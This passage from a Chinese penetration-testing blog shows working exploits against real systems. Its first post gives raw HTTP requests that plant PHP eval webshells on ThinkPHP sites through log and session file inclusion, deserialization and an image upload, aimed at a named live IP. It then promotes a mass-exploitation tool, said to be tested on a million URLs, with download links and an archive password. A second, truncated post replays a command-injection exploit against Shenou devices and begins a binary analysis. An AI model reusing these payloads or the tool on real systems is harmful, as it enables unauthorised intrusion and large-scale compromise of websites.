class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 517_method=__construct&amp;filter[]=think\__include_file&amp;method=GET&amp;get[]=./runtime/log/202406/15.log&amp;X=phpinfo();</span></code></pre><p>由于我的一句exp 是免杀的所以我就这里打一波马赛克吧。我们看到执行了123456789 。所以证明已经执行我们写一句话的代码。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271501432.png" alt="直接写一句话"><br>runtime log 目录下生成一句话木马<br><a href="http://103.106.188.58/runtime/log/202406/xxx.php">http://103.106.188.58/runtime/log/202406/xxx.php</a>   这里生成的木马可以修改防止没有访问权限到导致无法放到修改X&#x3D;修改这里的路径<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271505273.png" alt="访问我们的shell"><br>日志这个东西不太稳定另外有点麻烦。我们能不能使用别的方式进行。答案是可以的我们使用session来搞他以linux为例子。如果windows的话等遇到的时候实战搞一波在更新记录一下。</p><h2 id="三-session方式打"><a href="#三-session方式打" class="headerlink" title="三:session方式打"></a>三:session方式打</h2><p>创建session。linux为例子:</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=sessiontest; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 136_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=&lt;?php $a=strtoupper('$_post["x"]');eval("eval($a);")?>&amp;server[]=1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271508586.png" alt="生成session"><br>包含session</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=sessiontest; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 526_method=__construct&amp;filter[]=think\__include_file&amp;method=GET&amp;get[]=/tmp/sess_sessiontest&amp;X=phpinfo();</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271512019.png" alt="同上写shell"><br>访问一下shell<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271516089.png" alt="访问一下shell"><br>上面不管是日志还是session只要知道位置就可以直接打。另外这些太麻烦了我们能不能用别的打可以我们使用反序列化的打一下看看</p><h2 id="四-反序列化打法"><a href="#四-反序列化打法" class="headerlink" title="四:反序列化打法"></a>四:反序列化打法</h2><p>下图是没打成功</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> xxxx<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=sessiontest; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 1880_method=__construct&amp;method=get&amp;filter=unserialize&amp;get[]=反序列化payload</span></code></pre><p>没打成功<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271519340.png" alt="没打成功"><br>我们换一个站点看看。注意看返回判断是否成功<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271522313.png" alt="成功"><br>访问webshell<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271526124.png" alt="webshell"><br>exp poc 生成器 请参考<br><a href="https://www.anquanke.com/post/id/251318">https://www.anquanke.com/post/id/251318</a></p><h2 id="五-代码审计审计出上传漏洞进行文件"><a href="#五-代码审计审计出上传漏洞进行文件" class="headerlink" title="五:代码审计审计出上传漏洞进行文件"></a>五:代码审计审计出上传漏洞进行文件</h2><p>如果上述都打不成功那么使用代码审计审计出上传漏洞进行文件包含漏洞拿下权限。因为现在的站点都不是那么好拿了所以想办法拿到源代码代码审计只要有上传漏洞我们就可以拿下webshell。下面是我们对某编辑器审计上传漏洞从而拿下webshell<br>上传点</p><pre class="language-java" data-language="java"><code class="language-java">GET <span class="token operator">/</span><span class="token keyword">static</span><span class="token operator">/</span><span class="token keyword">public</span><span class="token operator">/</span>umeditor<span class="token operator">/</span>php<span class="token operator">/</span>imageUp<span class="token punctuation">.</span>php HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Origin</span><span class="token operator">:</span> <span class="token keyword">null</span>DNT<span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: close返回HTTP/1.1 200 OKServer: nginxDate: Sun, 16 Jun 2024 06:28:45 GMTContent-Type: text/html;charset=utf-8Connection: closeVary: Accept-EncodingContent-Length: 142&#123;"originalName":null,"name":null,"url":null,"size":null,"type":null,"state":"\u6587\u4ef6\u5927\u5c0f\u8d85\u51fa post_max_size \u9650\u5236"&#125;上传制作好的图片马POST /static/public/umeditor/php/imageUp.php HTTP/1.1Host: 103.106.188.58Content-Length: 1754Cache-Control: max-age=0Origin: nullDNT: 1Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIbsNB4Zw4vqxb9kGUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.7</span><span class="token class-name">Accept</span><span class="token operator">-</span><span class="token class-name">Encoding</span><span class="token operator">:</span> gzip<span class="token punctuation">,</span> deflate<span class="token punctuation">,</span> br<span class="token class-name">Accept</span><span class="token operator">-</span><span class="token class-name">Language</span><span class="token operator">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token class-name">Connection</span><span class="token operator">:</span> close<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token class-name">WebKitFormBoundaryIbsNB4Zw4vqxb9kG</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Disposition</span><span class="token operator">:</span> form<span class="token operator">-</span>data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"upfile"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"test.jpg"</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> image<span class="token operator">/</span>pngPNG<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token class-name">WebKitFormBoundaryIbsNB4Zw4vqxb9kG</span><span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Disposition</span><span class="token operator">:</span> form<span class="token operator">-</span>data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"submit"</span><span class="token class-name">Submit</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token class-name">WebKitFormBoundaryIbsNB4Zw4vqxb9kG</span><span class="token operator">--</span></code></pre><p>演示如下图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271533405.png" alt="审计上传"><br>包含拿下webshell</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 128_method=__construct&amp;filter[]=think\__include_file&amp;method=GET&amp;get[]=static/public/umeditor/php/upload/20240616/17185193394308.jpg</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271535946.png" alt="看到包含成功出现了php执行的特征"><br>拿下webshell<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271537644.png"></p><h2 id="自动化getshel"><a href="#自动化getshel" class="headerlink" title="自动化getshel"></a>自动化getshel</h2><p> 基于上述getshell方式除了日志方式软件已经全部集成<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271541266.png" alt="集成上述漏洞exp到软件"><br> 实战测试<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271542467.png" alt="批量实战测试"><br> 软件已经发布请到github进行下载。另外关于thinkphp 软件集成的如果拿不下shell会自动记录可以getshell方式。当然后续遇到情况会在此集成一波exp。当然对于在2024年这个年代光靠软件是不行的还得靠自己有带审计基础那事半功倍。</p><p>  在某一次无意中发现csdn有人宣传了一波。不得不说文笔不错。但是还是低调行事吧。不过这小子也挺有眼光的。这个软件截图如下</p><p>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271546768.png" alt="不得不说文笔不错"></p><h2 id="软件介绍"><a href="#软件介绍" class="headerlink" title="软件介绍"></a>软件介绍</h2><p>WebFrameworkTools 5.3 - 红队综合渗透测试利器<br>来源网站: <a href="https://blog.csdn.net/gitblog_00073/article/details/139490114">https://blog.csdn.net/gitblog_00073/article/details/139490114</a></p><p><strong>项目介绍</strong></p> <p>WebFrameworkTools 是一款强大的红队渗透测试工具&#xff0c;专为专业安全研究人员和渗透测试者设计。它集成了多种Web漏洞的POC和EXP&#xff0c;旨在简化和加速Web应用的安全评估过程。软件的最新版本5.3带来了诸多改进和新的漏洞库&#xff0c;使得安全专家能够快速响应新出现的威胁。</p> <p><strong>项目技术分析</strong></p> <p>该工具基于C#编程语言构建&#xff0c;其核心特性包括&#xff1a;</p> <ol><li><strong>一键生成利用EXP</strong>: 即使不具备编程背景的用户也能轻松生成exploit。</li><li><strong>自定义DLL功能</strong>: 对于有经验的开发者来说&#xff0c;可以通过编写自己的插件来扩展工具功能。</li><li><strong>内置漏洞库</strong>: 包含了大量的Web漏洞exploits&#xff0c;涵盖各种流行框架和平台。</li><li><strong>模块内部化</strong>: 优化了软件结构&#xff0c;减小体积&#xff0c;便于携带和使用。</li><li><strong>支持.NET Core线程池</strong>: 提高性能&#xff0c;增强DLL执行效率。</li><li><strong>智能HTTP头部Fuzzer</strong>: 帮助识别潜在的脆弱点。</li><li><strong>自动化漏洞检测</strong>: 可处理大量URL&#xff0c;实现大规模测试。</li></ol> <p><strong>应用场景</strong></p> <p>WebFrameworkTools适用于以下场景&#xff1a;</p> <ol><li><strong>企业安全建设</strong>: 用于合法授权的安全测试&#xff0c;帮助加强系统防护。</li><li><strong>渗透测试</strong>: 快速验证Web应用中的安全漏洞&#xff0c;有效提升测试效率。</li><li><strong>教育研究</strong>: 学习Web安全和渗透测试技巧&#xff0c;实践安全攻防。</li><li><strong>安全应急响应</strong>: 当新漏洞披露时&#xff0c;快速对目标环境进行安全扫描。</li></ol> <p><strong>项目特点</strong></p> <ol><li><strong>高度集成</strong>: 将多种工具&#xff08;如Vulmap、Http Fuzzer和Exploit Generator&#xff09;的功能融为一体&#xff0c;实现多功能一站式操作。</li><li><strong>便捷易用</strong>: 用户友好界面和一键式操作降低了使用门槛。</li><li><strong>持续更新</strong>: 持续跟进最新的漏洞信息&#xff0c;保持漏洞数据库的实时性。</li><li><strong>源代码安全</strong>: 开源计划即将启动&#xff0c;用户可审查代码确保透明度和安全性。</li><li><strong>合规性</strong>: 明确使用条款&#xff0c;强调合法使用&#xff0c;保护用户免受法律风险。</li></ol> <p><strong>结论</strong></p> <p>WebFrameworkTools 5.3以其全面的功能和易用性&#xff0c;成为了红队渗透测试领域的一款必备工具。无论是新手还是经验丰富的安全专家&#xff0c;都能从中受益。随着源代码即将对外开源&#xff0c;更多安全社区的贡献将会进一步丰富和完善这个项目。如果你从事相关领域的工作&#xff0c;不妨尝试一下WebFrameworkTools&#xff0c;让安全测试变得更加高效。</p>               <p>使用方式请参考博客或者github。或者加入频道。<br>下载地址:<br><a href="https://www.upload.ee/files/16822507/hwok.7z.html">https://www.upload.ee/files/16822507/hwok.7z.html</a> 软件4月份版本exp更新至最新版本。框架是4月份的这个版本达到一定程度就会出现奔溃。所以设置了最大条数5000条。2024-10-31日软件过期。慢慢用吧。就别分享了自己用就行了。授权文件下载:<a href="https://www.upload.ee/files/16851948/license.7z.html">https://www.upload.ee/files/16851948/license.7z.html</a> 解压密码:GL@kEzDu&amp;lh7 注意:下载的时候有广告如果弹到别的网站关闭。回到原来的地方在点击下载。直到弹出hwok.7z才是真正下载的软件。另一个也一样。自己琢磨吧。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感谢兄弟们推荐但是我们还是低调使用。另外关于上述文章说开源。那是对少部分人而不是大部分人。因为软件已经测试了100w条url 自动化全模块批量测试成功。如果大部分人有这个源代码会对互联网网站进行大批量攻击所以。我们有50套源代码。<br>测试100w 成功截图</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271554216.png" alt="100w全模块测试成功"><br>测试详情截图</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271556104.png" alt="100w url测试成功截图"><br>另外有国外exp poc的可以和我们联系以后国外的网站是巨大的市场。漏洞越多我们的软件可以至少批量100w条那么国外的市场就是我们的你懂的。后续不管是推广什么无敌的存在。另外关于源代码的请关注频道。准备编程知识和$当然这些频道有介绍。详细看频道吧。</p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>申瓯任意文件下载命令执行复盘审计</title>
      <link href="/codeaudit/2024/05/articles/c5b634cfecad72ae/"/>
      <url>/codeaudit/2024/05/articles/c5b634cfecad72ae/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在看公众号这篇<br><a href="https://mp.weixin.qq.com/s/9w2OgEZCSteyFyfeHx1eEA">https://mp.weixin.qq.com/s/9w2OgEZCSteyFyfeHx1eEA</a><br>文章后,我尝试使用自己的方式对这个漏洞进行复盘。因为二进制漏洞审计这玩意我也没有搞过所以正好看看。由于我是第一次搞这个文章有写的不是很明了的。请多多包涵。接下来言归正传开始分析。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>我们顺着他说的去吐司论坛去寻找关键字。找到这个。接下来我们<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311419129.png" alt="找文章"><br>我们在fofa上面搜索相关资产看看<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311422372.png" alt="fofa资产"><br>exp 如下:</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>main<span class="token operator">/</span>deal HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> xxxxx<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">119.0</span><span class="token number">.6045</span><span class="token number">.160</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9If-None-Match: "1363177655"If-Modified-Since: Sat, 20 Apr 2024 12:24:18 GMTConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 71addr_value=219&amp;pingname=127.0.0.1+-c+1+%0aid%0a&amp;pingtime=2&amp;packetsize=4</span></code></pre><p>实战效果如下图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311425974.png" alt="实战效果"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们下载下这个文件<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311430818.png" alt="下载"><br>我们使用ida打开进行分析。一般C 或者C++写都是main函数开头的所以我们直接搜索一下main<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311433216.png" alt="mian函数"><br>我们看到有一个请求方式的函数<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311434398.png" alt="请求方法"><br>判断请求方式是get还是post<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311435378.png" alt="判断请求方式"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311441011.png" alt="判断请求"><br>另外这里也可以证明post请求是去LABEL_32<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311451167.png"><br>在C++和C中1代表true<br>如果是post请求使用并且content-length大小不是0 也就是有请求数据那么到</p><pre class="language-C" data-language="C"><code class="language-C">LABEL_32:    v8 &#x3D; sub_11B80();    sub_25B2C();    return v8;  &#125;  if ( !sub_243D4() )    goto LABEL_32;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311447534.png" alt="判断"><br>我们看sub_11B80函数<br>我们看这里 应该是初始化参数</p><pre class="language-C" data-language="C"><code class="language-C">sub_26274(&quot;addr_value&quot;, &amp;v5, 0);  sub_26274(&quot;checksend&quot;, &amp;v4, 0);  sub_26274(&quot;language&quot;, &amp;dword_41848, 0);  sub_25CFC(&quot;username&quot;, &amp;dword_41E64, 32);  